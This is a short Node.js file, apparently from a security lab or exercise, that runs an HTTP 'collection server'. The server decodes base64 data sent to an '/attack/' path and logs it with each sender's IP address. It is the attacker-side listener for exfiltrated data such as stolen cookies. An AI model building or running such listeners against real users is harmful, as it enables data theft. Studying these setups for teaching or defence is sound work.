// in backend/collection-server.js
const dotenv = require("dotenv").config();

require("http")
  .createServer((req, res) => {
    console.log(
      req.connection.remoteAddress,
      Buffer.from(req.url.split("/attack/")[1], "base64").toString().trim()
    );
  })
  .listen(process.env.COLLECTE, () => {
    console.log("Serveur de collecte écoute sur le port ***1");
  });
